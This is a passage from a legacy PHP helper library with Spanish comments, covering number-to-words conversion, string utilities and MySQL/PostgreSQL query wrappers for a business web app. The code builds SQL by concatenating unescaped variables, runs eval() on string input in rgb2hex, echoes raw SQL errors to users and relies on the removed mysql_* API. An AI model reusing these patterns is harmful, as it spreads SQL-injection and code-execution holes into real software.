		q("insert into app_bitacora (ano,mes,dia,hora,minuto,segundo,nick,nombre,tabla,accion,registro,ip,detalle)
			values ('".date('Y')."','".date('m')."','".date('d')."','".date('G')."','".date('i')."',
			'".date('s')."','".$_SESSION['Nick']."','".$_SESSION['Nombre']."','$Nombre_tabla','$Accion','$Registro','".$_SERVER['REMOTE_ADDR']."','$Cambios')");
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#********************************************FUNCIONES DE CADENA****************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function tximp($DATO) { return str_replace("\r", "<br>", $DATO); } // convierte los enteres en la cadena <br> de html

function g($Dato) { return str_replace(" ", "_", $Dato); } // reemplaza guiones bajos por espacios para mostrar en los graficos de un reporte

function tx($CADENA) { return addcslashes($CADENA, "\0..\37!@\@\'\"\$\(\)\.\,\+\*\?\{\}\[\]\/\177..\377\\\\");}  //Adiciona back-slashes a una cadena

function coma_format($num) // convierte $num a una expresion de numeros separado por comas y con 0 decimales
{
	$number = sprintf("%01.0f", $num);
	while (preg_match("!(-?\d+)(\d\d\d)!", $number)) $number = preg_replace("!(-?\d+)(\d\d\d)!", "$1,$2", $number);
	return $number;
}

function coma_formatd($Numero=0,$PosDecimales=0)
{
	$Cadena=strval(round(abs($Numero),$PosDecimales));
	if(!strpos($Cadena,'.')) $Cadena.='.00';
	$Negativo=($Numero<0);
	$Entero=substr($Cadena,0,strpos($Cadena,'.'));
	$Decimal=substr($Cadena,strlen($Entero)+1);
	$Decimal=str_pad($Decimal,$PosDecimales,'0',STR_PAD_RIGHT);
	$Largo=strlen($Entero);
	$Residuo=fmod($Largo,3);
	$Resultado=substr($Entero,0,$Residuo);
	while($Residuo<$Largo)
	{
		$Resultado.=($Resultado?'.':'').substr($Entero,$Residuo,3);
		$Residuo+=3;
	}
	if($Negativo) $Resultado='-'.$Resultado;
	if($PosDecimales)
		return $Resultado.','.$Decimal;
	else
		return $Resultado;
}

function coma($num) // convierte $num a presentacion monetaria
{
	$number = sprintf("%01.0f", $num);
	while (preg_match("!(-?\d+)(\d\d\d)!", $number)) $number = preg_replace("!(-?\d+)(\d\d\d)!", "$1,$2", $number);
	if($num < 0) return "<font color='red'>(" . $number . ")</font>";
	else return $number;
}

function check_value($num) { if($num) return "CHECKED"; ELSE RETURN ""; } // convierte 1 en ON y 0 en OFF en un campo CHECKED

function r($cadena, $posiciones) { return substr($cadena, strlen($cadena) - $posiciones, $posiciones);} // trae de Cadena las $posiciones de la derecha

function l($cadena, $posiciones) { return substr($cadena, 0, $posiciones); } // trae de Cadena las $posiciones de la izquierda

function sino($Dato) { return ($Dato=="on"?1:0); } // convierte ON en 1 y OFF en 0

function gsino($num) { return ($num?"<img src='gifs/standar/si.png' border='0'>":"");} // graficamente representa 1 en un checked y 0 en una caja vacia

function gfoto($Ruta, $Tamano = 100, $Border = 0, $Vespacio = 0, $Amplia = 1, $Nulo = 0) // presenta de forma organizada y de un tamaño comun las imagenes en la vista MUESTRA_TABLA
{
	if(empty($Ruta))
	{
		if($Nulo == 1)
			return "";
		else
			return "<img src='gifs/foto_gris1.gif' border=0>";
	}
	else
	{
		# $Ruta=str_replace('img/tb/','',$Ruta);
		if ($Amplia)
		{
			if(strpos(r($Ruta, 5), '.pdf'))
			{
				return "<img src='gifs/pdf.jpg' border=0 onclick=\"javascript:modal2('$Ruta',0,0,600,800,'Foto');void(null);\" alt='CLICK PARA VER EN TAMAÑO ORIGINAL' title='CLICK PARA VER EN TAMAÑO ORIGINAL'>";
			}
			else
			{
				return "<div class='thumbnail'>
						<a href='$Ruta' rel='lightbox[fotos]' title='puede usar el mouse o las teclas  de flechas, presione esc para salir'><img src='$Ruta' border=$Border width=$Tamano Hspace=$Vespacio Vspace=$Vespacio alt='CLICK PARA VER EN TAMAÑO ORIGINAL' title='CLICK PARA VER EN TAMAÑO ORIGINAL'></a></div>";
			}
		}
		else
		{
			return "<img src='$Ruta' border=$Border width=$Tamano Hspace=$Vespacio Vspace=$Vespacio>";
		}
	}
}

function gweb($Ruta) { return ($Ruta?"<a href='$Ruta' target='_blank'>$Ruta</a>":"");} // presenta en formato href una ruta url

function enletras($_NUMEROENL, $MONETARIO = 0, $MONEDA = 'PESOS MCTE.') // Funcion recursiva auxiliar para convertir numeros  letras
{
	$TFNUMERO = '';
	$NUMTEMPO = sprintf("%015.2f", abs($_NUMEROENL));

	IF(strlen($NUMTEMPO) < 18) $NUMTEMPO = sprintf("%018.2f", abs($_NUMEROENL));
	for($POSICION = 0;$POSICION < 5;$POSICION++)
	{
		$CENTENA = intval(substr($NUMTEMPO, 3 * ($POSICION), 1));
		$DECENA = intval(substr($NUMTEMPO, 3 * ($POSICION) + 1, 1));
		$UNIDAD = intval(substr($NUMTEMPO, 3 * ($POSICION) + 2, 1));
		$LEYENDA = "";
		switch($POSICION)
		{
			case 0:
				IF($UNIDAD + $DECENA + $CENTENA == 1) $LEYENDA = "BILLON ";
				elseif($UNIDAD + $DECENA + $CENTENA > 1) $LEYENDA = "BILLONES ";
				break;
			case 1:
				IF ($DECENA + $CENTENA + $UNIDAD >= 1 AND intval(substr($NUMTEMPO, 6, 3)) == 0) $LEYENDA = "MIL MILLONES ";
				ELSE IF($DECENA + $CENTENA + $UNIDAD >= 1) $LEYENDA = "MIL ";
				break;
			case 2:
				if($CENTENA + $DECENA == 0 and $UNIDAD == 1) $LEYENDA = "MILLON ";
				elseif($CENTENA == 0 and $DECENA + $UNIDAD == 1) $LEYENDA = "MILLONES ";
				elseif($CENTENA == 1 and $DECENA + $UNIDAD == 0) $LEYENDA = "MILLONES ";
				elseif($CENTENA + $DECENA + $UNIDAD > 1) $LEYENDA = "MILLONES ";
				break;
			case 3:
				if($CENTENA + $DECENA + $UNIDAD >= 1) $LEYENDA = "MIL ";
				break;
			case 4:
				if($CENTENA + $DECENA + $UNIDAD >= 1) $LEYENDA = "";
				break;
		}
		$TFNUMERO .= centenas($UNIDAD, $DECENA, $CENTENA) . decenas($UNIDAD, $DECENA, $CENTENA) . unidades($UNIDAD, $DECENA, $CENTENA, $MONETARIO,$POSICION) . $LEYENDA;
		$LEYENDA = "";
	}
	IF ($MONETARIO)
	{
		if(intval($_NUMEROENL) == 0) $LEYENDA1 = "CERO $MONEDA ";
		elseif(intval($_NUMEROENL) == 1) $LEYENDA1 = "$MONEDA ";
		elseif(intval(substr($NUMTEMPO, 3, 12)) == 0 or intval(substr($NUMTEMPO, 9, 6)) == 0) $LEYENDA1 = "DE $MONEDA ";
		else $LEYENDA1 = "$MONEDA ";
		$TFNUMERO .= $LEYENDA1 . "CON " . r($NUMTEMPO, 2) . " CENTAVOS.";
	}
	else
	{
		if(intval($_NUMEROENL) == 0) $TFNUMERO .= "CERO ";
		if (intval(r($NUMTEMPO, 2)) > 0)
			$TFNUMERO .= "PUNTO " .(l(r($NUMTEMPO,2),1)=='0'?"CERO ":"").enletras(r($NUMTEMPO, 2));
	}
	return $TFNUMERO;
}

function centenas($PUNIDAD, $PDECENA, $PCENTENA) // Funcion recursiva auxiliar para convertir numeros  letras
{
	if($PCENTENA == 1 and ($PDECENA == 0 and $PUNIDAD == 0)) return "CIEN ";
	elseif($PCENTENA == 1 and ($PDECENA > 0 or $PUNIDAD > 0)) return "CIENTO ";
	else
	{
		switch ($PCENTENA)
		{
			case 2: return "DOSCIENTOS ";
				break;
			case 3: return "TRESCIENTOS ";
				break;
			case 4: return "CUATROCIENTOS ";
				break;
			case 5: return "QUINIENTOS ";
				break;
			case 6: return "SEISCIENTOS ";
				break;
			case 7: return "SETECIENTOS ";
				break;
			case 8: return "OCHOCIENTOS ";
				break;
			case 9: return "NOVECIENTOS ";
				break;
			default: return "";
				break;
		}
	}
}

function decenas($PUNIDAD, $PDECENA, $PCENTENA) // Funcion recursiva auxiliar para convertir numeros  letras
{
	if($PDECENA == 1 AND $PUNIDAD == 0) $RESULTADODECENA = "DIEZ ";
	elseif($PDECENA == 1 AND $PUNIDAD == 1) $RESULTADODECENA = "ONCE ";
	elseif($PDECENA == 1 AND $PUNIDAD == 2) $RESULTADODECENA = "DOCE ";
	elseif($PDECENA == 1 AND $PUNIDAD == 3) $RESULTADODECENA = "TRECE ";
	elseif($PDECENA == 1 AND $PUNIDAD == 4) $RESULTADODECENA = "CATORCE ";
	elseif($PDECENA == 1 AND $PUNIDAD == 5) $RESULTADODECENA = "QUINCE ";
	elseif($PDECENA == 1 AND ($PUNIDAD >= 6 and $PUNIDAD <= 9)) $RESULTADODECENA = "DIECI";
	elseif($PDECENA == 2 and $PUNIDAD == 0) $RESULTADODECENA = "VEINTE ";
	elseif($PDECENA == 2 and $PUNIDAD > 0) $RESULTADODECENA = "VEINTI";
	else
	{
		switch($PDECENA)
		{
			case 3: $RESULTADODECENA = "TREINTA ";
				break;
			case 4: $RESULTADODECENA = "CUARENTA ";
				break;
			case 5: $RESULTADODECENA = "CINCUENTA ";
				break;
			case 6: $RESULTADODECENA = "SESENTA ";
				break;
			case 7: $RESULTADODECENA = "SETENTA ";
				break;
			case 8: $RESULTADODECENA = "OCHENTA ";
				break;
			case 9: $RESULTADODECENA = "NOVENTA ";
				break;
			default: $RESULTADODECENA = "";
				break;
		}
	}
	if($PUNIDAD > 0 and $PDECENA > 2) $RESULTADODECENA .= "Y ";
	return $RESULTADODECENA;
}

function unidades($PUNIDAD, $PDECENA, $PCENTENA, $MONETARIO, $POSICION)  // Funcion recursiva auxiliar para convertir numeros  letras
{
	if($PUNIDAD==1 and $PDECENA==0 and $PCENTENA==0 and ($POSICION==3 || $POSICION==1)) return "";
	elseif($PUNIDAD==1 and $PDECENA!=1 and $POSICION<=3) return "UN ";
	elseif($PUNIDAD == 1 and $PDECENA != 1) return ($MONETARIO?"UN ":"UNO ");
	elseif($PUNIDAD == 2 and $PDECENA != 1) return "DOS ";
	elseif($PUNIDAD == 3 and $PDECENA != 1) return "TRES ";
	elseif($PUNIDAD == 4 and $PDECENA != 1) return "CUATRO ";
	elseif($PUNIDAD == 5 and $PDECENA != 1) return "CINCO ";
	else
	{
		switch($PUNIDAD)
		{
			case 6: return "SEIS ";
				break;
			case 7: return "SIETE ";
				break;
			case 8: return "OCHO ";
				break;
			case 9: return "NUEVE ";
				break;
			default: return "";
				break;
		}
	}
}

function inlist($Campo, $Cadena, $Car = ",")   // retorna 1 cuando el CAMPO está contenido en la CADENA separada por CAR la cadena debe estar dada en formato alfanumerico
{
	$Filas = explode($Car, $Cadena);
	foreach($Filas as $Valorfila)
	{
		if(strcmp($Valorfila, $Campo) == 0)
		{
			return 1;
		}
	}
	return 0;
}

function stro($Cadena, $Caracter, $Ocurrencia = 1) // extrae el final de una cadena a partir de la posición $ocurrencia del caracter $Caracter
{
	for ($i = 1;$i <= $Ocurrencia;$i++)
	{
		$Cadena = trim(substr($Cadena, strpos($Cadena, $Caracter) + (($i == $Ocurrencia)?0:1)));
	}
	return $Cadena;
}

function aparece($Cadena, $Texto)  // busca si CADENA está en una lista en TEXTO separado por comas
{
	$Textos = explode(',', $Texto);
	for($i = 0;$i < count($Textos);$i++) if(strpos(' ' . $Cadena, $Textos[$i])) return 1;
	return 0;
}

function transforma($TEXTO, $TIPO = 0) // no se tiene información sobre esta funcion posiblemente usada en scripts antiguos
{
	IF($TIPO == 0)
	{
		$NUEVO = '';
		FOR($i = 0;$i < strlen($TEXTO);$i++) $NUEVO .= ord($TEXTO[$i]) . ',';
		RETURN $NUEVO;
	}
	ELSE
	{
		$NUEVO = '';
		$ARREGLO = SPLIT(',', $TEXTO);
		for($i = 0;$i < count($ARREGLO)-1;$i++) $NUEVO .= chr($ARREGLO[$i]);
		IF($TIPO == 1)
			RETURN $NUEVO;
		ELSEIF($TIPO == 2)
			RETURN addslashes($NUEVO);
	}
}

function rgb2hex($Arreglo) // funcion que convierte un arreglo de 3 enteros (0..255) a su correspondiente codigo en hexadecimal para generar COLORES
{
	if(!empty($Arreglo))
	{
		if(is_string($Arreglo)) eval('$Arreglo=' . $Arreglo . ';');
		return dechex($Arreglo[0]) . dechex($Arreglo[1]) . dechex($Arreglo[2]);
	}
	else
		return '000000';
}

function recorta($_variable)  { $_variable = l($_variable, strlen($_variable)-1); return $_variable; }   // funcion que le quita el último caracter de la derecha a una cadena

function quitatildes($Cadena)  // elimina las tildes de una cadena
{
	$Cadena = str_replace('á', 'a', $Cadena);
	$Cadena = str_replace('é', 'e', $Cadena);
	$Cadena = str_replace('í', 'i', $Cadena);
	$Cadena = str_replace('ó', 'o', $Cadena);
	$Cadena = str_replace('ú', 'u', $Cadena);
	$Cadena = str_replace('ñ', 'n', $Cadena);
	$Cadena = str_replace('Á', 'A', $Cadena);
	$Cadena = str_replace('É', 'E', $Cadena);
	$Cadena = str_replace('Í', 'I', $Cadena);
	$Cadena = str_replace('Ó', 'O', $Cadena);
	$Cadena = str_replace('Ú', 'U', $Cadena);
	$Cadena = str_replace('Ñ', 'N', $Cadena);
	return $Cadena;
}

function quitatildest($Archivo, $Campo1 = '', $Campo2 = '', $Campo3 = '', $Campo4 = '', $Campo5 = '', $Campo6 = '', $Campo7 = '', $Campo8 = '', $Campo9 = '') // Elimina las tildes de hasta nueve campos de una tabla
{
	if($Campo1) q("update $Archivo set $Campo1=replace($Campo1,'á','a'),$Campo1=replace($Campo1,'é','e'),$Campo1=replace($Campo1,'í','i'),$Campo1=replace($Campo1,'ó','o'),$Campo1=replace($Campo1,'ú','u'),$Campo1=replace($Campo1,'ñ','n'),
		  $Campo1=replace($Campo1,'Á','A'),$Campo1=replace($Campo1,'É','E'),$Campo1=replace($Campo1,'Í','I'),$Campo1=replace($Campo1,'Ó','O'),$Campo1=replace($Campo1,'Ú','U'),$Campo1=replace($Campo1,'Ñ','N')");
	if($Campo2) q("update $Archivo set $Campo2=replace($Campo2,'á','a'),$Campo2=replace($Campo2,'é','e'),$Campo2=replace($Campo2,'í','i'),$Campo2=replace($Campo2,'ó','o'),$Campo2=replace($Campo2,'ú','u'),$Campo2=replace($Campo2,'ñ','n'),
		  $Campo2=replace($Campo2,'Á','A'),$Campo2=replace($Campo2,'É','E'),$Campo2=replace($Campo2,'Í','I'),$Campo2=replace($Campo2,'Ó','O'),$Campo2=replace($Campo2,'Ú','U'),$Campo2=replace($Campo2,'Ñ','N')");
	if($Campo3) q("update $Archivo set $Campo3=replace($Campo3,'á','a'),$Campo3=replace($Campo3,'é','e'),$Campo3=replace($Campo3,'í','i'),$Campo3=replace($Campo3,'ó','o'),$Campo3=replace($Campo3,'ú','u'),$Campo3=replace($Campo3,'ñ','n'),
		  $Campo3=replace($Campo3,'Á','A'),$Campo3=replace($Campo3,'É','E'),$Campo3=replace($Campo3,'Í','I'),$Campo3=replace($Campo3,'Ó','O'),$Campo3=replace($Campo3,'Ú','U'),$Campo3=replace($Campo3,'Ñ','N')");
	if($Campo4) q("update $Archivo set $Campo4=replace($Campo4,'á','a'),$Campo4=replace($Campo4,'é','e'),$Campo4=replace($Campo4,'í','i'),$Campo4=replace($Campo4,'ó','o'),$Campo4=replace($Campo4,'ú','u'),$Campo4=replace($Campo4,'ñ','n'),
		  $Campo4=replace($Campo4,'Á','A'),$Campo4=replace($Campo4,'É','E'),$Campo4=replace($Campo4,'Í','I'),$Campo4=replace($Campo4,'Ó','O'),$Campo4=replace($Campo4,'Ú','U'),$Campo4=replace($Campo4,'Ñ','N')");
	if($Campo5) q("update $Archivo set $Campo5=replace($Campo5,'á','a'),$Campo5=replace($Campo5,'é','e'),$Campo5=replace($Campo5,'í','i'),$Campo5=replace($Campo5,'ó','o'),$Campo5=replace($Campo5,'ú','u'),$Campo5=replace($Campo5,'ñ','n'),
		  $Campo5=replace($Campo5,'Á','A'),$Campo5=replace($Campo5,'É','E'),$Campo5=replace($Campo5,'Í','I'),$Campo5=replace($Campo5,'Ó','O'),$Campo5=replace($Campo5,'Ú','U'),$Campo5=replace($Campo5,'Ñ','N')");
	if($Campo6) q("update $Archivo set $Campo6=replace($Campo6,'á','a'),$Campo6=replace($Campo6,'é','e'),$Campo6=replace($Campo6,'í','i'),$Campo6=replace($Campo6,'ó','o'),$Campo6=replace($Campo6,'ú','u'),$Campo6=replace($Campo6,'ñ','n'),
		  $Campo6=replace($Campo6,'Á','A'),$Campo6=replace($Campo6,'É','E'),$Campo6=replace($Campo6,'Í','I'),$Campo6=replace($Campo6,'Ó','O'),$Campo6=replace($Campo6,'Ú','U'),$Campo6=replace($Campo6,'Ñ','N')");
	if($Campo7) q("update $Archivo set $Campo7=replace($Campo7,'á','a'),$Campo7=replace($Campo7,'é','e'),$Campo7=replace($Campo7,'í','i'),$Campo7=replace($Campo7,'ó','o'),$Campo7=replace($Campo7,'ú','u'),$Campo7=replace($Campo7,'ñ','n'),
		  $Campo7=replace($Campo7,'Á','A'),$Campo7=replace($Campo7,'É','E'),$Campo7=replace($Campo7,'Í','I'),$Campo7=replace($Campo7,'Ó','O'),$Campo7=replace($Campo7,'Ú','U'),$Campo7=replace($Campo7,'Ñ','N')");
	if($Campo8) q("update $Archivo set $Campo8=replace($Campo8,'á','a'),$Campo8=replace($Campo8,'é','e'),$Campo8=replace($Campo8,'í','i'),$Campo8=replace($Campo8,'ó','o'),$Campo8=replace($Campo8,'ú','u'),$Campo8=replace($Campo8,'ñ','n'),
		  $Campo8=replace($Campo8,'Á','A'),$Campo8=replace($Campo8,'É','E'),$Campo8=replace($Campo8,'Í','I'),$Campo8=replace($Campo8,'Ó','O'),$Campo8=replace($Campo8,'Ú','U'),$Campo8=replace($Campo8,'Ñ','N')");
	if($Campo9) q("update $Archivo set $Campo9=replace($Campo9,'á','a'),$Campo9=replace($Campo9,'é','e'),$Campo9=replace($Campo9,'í','i'),$Campo9=replace($Campo9,'ó','o'),$Campo9=replace($Campo9,'ú','u'),$Campo9=replace($Campo9,'ñ','n'),
		  $Campo9=replace($Campo9,'Á','A'),$Campo9=replace($Campo9,'É','E'),$Campo9=replace($Campo9,'Í','I'),$Campo9=replace($Campo9,'Ó','O'),$Campo9=replace($Campo9,'Ú','U'),$Campo9=replace($Campo9,'Ñ','N')");
}

function a_mayuscula($cadena)  // Convierte los caracteres con tilde a mayusculas
{
	$cadena=str_replace('á','Á',$cadena);
	$cadena=str_replace('é','É',$cadena);
	$cadena=str_replace('í','Í',$cadena);
	$cadena=str_replace('ó','Ó',$cadena);
	$cadena=str_replace('ú','Ú',$cadena);
	$cadena=str_replace('ñ','Ñ',$cadena);
	return $cadena;
}

function a_minuscula($cadena)  // Convierte los caracteres con tilde a minusculas
{
	$cadena=str_replace('Á','á',$cadena);
	$cadena=str_replace('É','é',$cadena);
	$cadena=str_replace('Í','í',$cadena);
	$cadena=str_replace('Ó','ó',$cadena);
	$cadena=str_replace('Ú','ú',$cadena);
	$cadena=str_replace('Ñ','ñ',$cadena);
	return $cadena;
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#**********************************************FUNCIONES DE BASE DE DATOS********************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function generar_t_mysql() // Funcion que crea funciones en el motor de base de datos mysql para ser usado en browtabla
{
	global $Tabla,$Campo;
	$D=qo("select campo,traet,traen,trael,traex from ".$Tabla."_t where id=$Campo");
	if($D->traet && $D->traen && $D->trael)
	{
		$Tipo=qo("show columns from $D->traet like '$D->trael'");
		q("drop function if exists t_$D->traet");
		$Comando="create function T_$D->traet(Dato_ $Tipo->Type) returns varchar(200) reads sql data
		begin Declare Resultado_ varchar(200) default ''; Select $D->traen into Resultado_ from $D->traet where $D->trael = Dato_ limit 1;  return Resultado_; end;";
		q($Comando,1);
		html();
		echo "<body><script language='javascript'>centrar(600,300);alert('Función MySQL T_$D->traet creada satisfactoriamente');window.close();void(null);</script></body>";
	}
	elseif(!$D->traet && $D->traex && strpos($D->traex,';'))
	{
		$Cases=str_replace(';', "' When '",$D->traex);
		$Cases=str_replace(',',"' Then '",$Cases);
		$Nombre_funcion='M_'.$Tabla.'_'.$D->campo;
		//$this->menudirecto=true;
		$Esta=false;
		if($Funcion=q("show function status like '$Nombre_funcion' "))
		{
			while($Funcion_detalle=mysql_fetch_row($Funcion))
			{
				if($Funcion_detalle[0]==MYSQL_D && $Funcion_detalle[1]==$Nombre_funcion)
				{
					$Esta=true; break;
				}
			}
		}
		if($Esta) q("drop function $Nombre_funcion");
		$Tipo=qo("show columns from $Tabla like '$D->campo' ");
		$Comando="create function $Nombre_funcion(Dato $Tipo->Type) returns varchar(200) no sql
			begin Declare Resultado varchar(200) default '';
			select case Dato when '$Cases' end into Resultado; return Resultado; end;";
			echo $Comando;
		q($Comando,1);
		html();
		echo "<body><script language='javascript'>centrar(600,300);alert('Función MySQL $Nombre_funcion creada satisfactoriamente');window.close();void(null);</script></body>";
	}
	else
	{
		html();
		echo "<body><script language='javascript'>centrar(600,300);alert('No hay relación configurada con otra tabla');window.close();void(null);</script></body>";
	}
}

include('../Control/operativo/config/resuelve.php');

function q($cadena, $Devolver_sql = 0,&$_Cantidad_registros_afectados=0) // corre un query invocado internamente
{
	global $Nombre, $Id_alterno, $Num_Tabla,$LINK;

	if(!$LINK = mysql_connect(MYSQL_S, resuelve_usuario_mysql($cadena), MYSQL_P)) die('Problemas con la conexion de la base de datos!');
	mysql_query('SET collation_connection = utf8_general_ci',$LINK);
	if(!mysql_select_db(MYSQL_D, $LINK)) die('Problemas con la seleccion de la base de datos');
	if(strpos(' '.$cadena,'update ') || strpos(' '.$cadena,'alter table') || strpos(' '.$cadena,'insert '))
		mysql_query("set innodb_lock_wait_timeout=80",$LINK);
	else
		mysql_query("set innodb_lock_wait_timeout=20",$LINK);
	if($RQ = mysql_query($cadena, $LINK))
	{
		if($Devolver_sql)
		{
			mysql_close($LINK);
			return $RQ;
		}
		if(strpos(' ' . strtolower($cadena), 'insert '))
		{
			$IDR = mysql_insert_id($LINK);
			$_Cantidad_registros_afectados=mysql_affected_rows($LINK);
			mysql_close($LINK);
			return $IDR;
		}
		if(strpos(' ' . strtolower($cadena), 'update '))
		{
			$AFECTADAS = mysql_affected_rows($LINK);
			mysql_close($LINK);
			return $AFECTADAS;
		}
		if(strpos(' ' . strtolower($cadena), 'create'))
		{
			$_Cantidad_registros_afectados=mysql_affected_rows($LINK);
			mysql_close($LINK);
			return true;
		}
		if((strpos(' ' . strtolower($cadena), 'select ') || strpos(' ' . strtolower($cadena), 'show ') || strpos(' ' . strtolower($cadena), 'analyze ') || strpos(' ' . strtolower($cadena), 'check ') || strpos(' ' . strtolower($cadena), 'optimize ') || strpos(' ' . strtolower($cadena), 'repair ')
					) && (!strpos(' ' . strtolower($cadena), 'insert ') || !strpos(' ' . strtolower($cadena), 'update ')))
		{
			mysql_close($LINK);
			if($Devolver_sql) return $RQ;
			if(mysql_num_rows($RQ))
			{
				return $RQ;
			}
			else
			{
				return false;
			}
		}
	}
	else
	{
		$Error_de_mysql = mysql_error();
		mysql_close($LINK);
		if(strpos(' ' . $Error_de_mysql, 'Duplicate entry'))
		{
			html();
			echo "<h3>Entrada Duplicada, no se pudo ingresar el nuevo registro</h3><script language='javascript'>alert('ENTRADA DUPLICADA, el registro no se pudo modificar o guardar.');</script>Debe ";
			if($Num_Tabla)
			{
				echo "<a href='javascript:oculta_edicion($Num_Tabla,false);'>cerrar esta ventana</a> e intentarlo nuevamente.";
			}
			else
				echo "<a href='javascript:window.close();void(null);'>cerrar esta ventana</a> e intentarlo nuevamente.";
			die();
		}
		elseif(strpos(' '.$Error_de_mysql,'Lock wait timeout exceeded') && strpos(' '.$cadena,'update') )
		{
			q($cadena);
		}
		else
		{
			# debug_print_backtrace();
			echo "<br><br><b>Error en :<br>" . $cadena . "</b><br>Error: $Error_de_mysql<br>";
			enviar_gmail("sistemas@aoaoclombia.com",'Gestion de Procesos','sergiocastillo@aoacolombia.com,Sergio Castillo','',"Mysql Error",
			"<H3>Error MySQL </H3>Instruccion: $cadena<br>Error: $Error_de_mysql <br>Usuario: ".$_SESSION['User']."-".$_SESSION['Nick']);
			die();
		}
	}
}

function qo($cadena) // corre un query y retorna mysql_fetch_object del primer registro encontrado
{
	if($Resultado = q($cadena))
		return mysql_fetch_object($Resultado);
	else return false;
}

function qo1($cadena) // corre un query y retorna el primer campo del primer registro encontrado
{
	if($Resultado = q($cadena))
	{
		$Registro = mysql_fetch_row($Resultado);
		return $Registro[0];
	}
	else
		return false;
}

function qo2($cadena, $Separador = ', ') ## traer información desde un sql y los resultados se retornan unidos en una cadena con un separador
{
	$Resultado_final = '';
	$Switch_separador = false;
	if($Resultado = q($cadena))
	{
		while($Re = mysql_fetch_row($Resultado))
		{
			$Resultado_final .= ($Switch_separador?$Separador:"") . $Re[0];
			$Switch_separador = true;
		}
		return $Resultado_final;
	}
	else
		return false;
}

function qo2M($cadena, $Separador = ', ',$LINKM) ## traer información desde un sql y los resultados se retornan unidos en una cadena con un separador
{
	$Resultado_final = '';
	$Switch_separador = false;
	if($Resultado = mysql_query($cadena,$LINKM))
	{
		while($Re = mysql_fetch_row($Resultado))
		{
			$Resultado_final .= ($Switch_separador?$Separador:"") . $Re[0];
			$Switch_separador = true;
		}
		return $Resultado_final;
	}
	else
		return false;
}

function qom($Cadenaq, $LINKM) // corre un query y retorna mysql_fetch_object del primer registro encontrado sin cerrar la sesion mysql
{
	if($LINKM)
	{
		if($Resultado_inicial = mysql_query($Cadenaq, $LINKM))
		{
			if($Resultado = mysql_fetch_object($Resultado_inicial))
			{
				return $Resultado;
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}
	else
	{
		return false;
	}
}

function qo1m($Cadenaq, $LINKM) // corre un query y retorna el primer campo del primer registro encontrado sin cerrar la sesion mysql
{
	if($LINKM)
	{
		if($Resultado_inicial = mysql_query($Cadenaq, $LINKM))
		{
			if($Resultado = mysql_fetch_row($Resultado_inicial))
			{
				return $Resultado[0];
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}
	else
	{
		return false;
	}
}

function qp($cadena, $Devolver_sql = 0) ## correr un sql en posgres
{
	global $Nombre, $Id_alterno;
	if(!$LINK = pg_connect("host=" . PSQL_S . " port=" . PSQL_SP . " dbname=" . PSQL_D . " user=" . PSQL_U . " password=" . PSQL_P)) die('Problemas con la conexion de la base de datos!');
	if($RQ = pg_exec($LINK, $cadena))
	{
		if((strpos(' ' . strtolower($cadena), 'select ') || strpos(' ' . strtolower($cadena), 'show ')) && (!strpos(' ' . strtolower($cadena), 'insert ') || !strpos(' ' . strtolower($cadena), 'update ')))
		{
			pg_close($LINK);
			if($Devolver_sql) return $RQ;
			if(pg_num_rows($RQ))
			{
				return $RQ;
			}
			else
			{
				return false;
			}
		}
		else
		{
			if(strpos(' ' . strtolower($cadena), 'insert '))
			{
				$IDR = pg_last_oid($RQ);
				pg_close($LINK);
				return $IDR;
			}
			else
			{
				pg_close($LINK);
				return true;
			}
		}
	}
	else
	{
		$Error_de_pgsql = pg_errormessage($LINK);
		pg_close($LINK);
		if(strpos(' ' . $Error_de_pgsql, 'Duplicate entry'))
		{
			echo "<h3>Entrada Duplicada, no se pudo ingresar el nuevo registro</h3><script language='javascript'>alert('ENTRADA DUPLICADA, el registro no se pudo modificar o guardar.');</script>
						Debe <a href='javascript:window.close();void(null);'>cerrar esta ventana</a> e intentarlo nuevamente.";
			die();
		}
		else
		{
			# debug_print_backtrace();
			echo "<br><br><b>Error en :<br>" . $cadena . "</b><br>Error: $Error_de_pgsql<br>";
			die();
		}
	}
}

function qpo($cadena) # corre un sql en postgress y deja en una variable objeto los campos y contenidos del primer registro encontrado
{
	if($Resultado = qp($cadena))
		return pg_fetch_object($Resultado);
	else return false;
}

function qpo1($cadena) ## corre un query en postgress y retorna el primer campo del primer registro encontrado
{
	if($Resultado = qp($cadena))
	{
		$Registro = pg_fetch_row($Resultado);
		return $Registro[0];
	}
	else
		return false;
}

function grabar_definicion_campo() // Graba la definición de campo
{
	global $Nombre_tabla,$descripcion,$explicacion,$traen,$trael,$traec,$coma,$caja,$password,$Traet,$traex,$usuario,$cond_modi,
	$columnas,$nueva_tabla,$orden,$suborden,$fondo_desc,$primer_desc,$coldes,$cols_text,$ancho_tabla,
	$fondo_celda,$fondo_campo,$primer_campo,$pasa_descripcion,$nover,$rows_text,$scambio,$verx,$capa,
	$nocapturar,$blanco0,$browdirecto,$supermod,$sizecap,$rutaimg,$tagbusca,$buscapopup,$rowspan1,$rowspan2,$obliga,$obligan,
	$busca_ciudad,$td_propiedades,$balfabeto,$htmladd,$idcampo,$Capa,$tamrecimg;
	if($Capa)
	{
		setcookie('DC_Capa',$Capa,time()+60*60*24*15);
	}
	$coma = sino($coma);
	$caja = sino($caja);
	$password = sino($password);
	$pasa_descripcion = sino($pasa_descripcion);
	$nueva_tabla = sino($nueva_tabla);
	$nover = sino($nover);
	$blanco0 = sino($blanco0);
	$browdirecto = sino($browdirecto);
	$supermod = sino($supermod);
	$Nohtmladd = sino($Nohtmladd);
	$tagbusca = sino($tagbusca);
	$buscapopup = sino($buscapopup);
	$obliga = sino($obliga);
	$obligan = sino($obligan);
	$busca_ciudad = sino($busca_ciudad);
	$balfabeto = sino($balfabeto);

	if(MODO_GRABACION_MYSQL==3)
	{
		$cond_modi=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['cond_modi']));
		$traex=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['traex']));
		$traec=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['traec']));
		$traen=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['traen']));
		$verx=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['verx']));
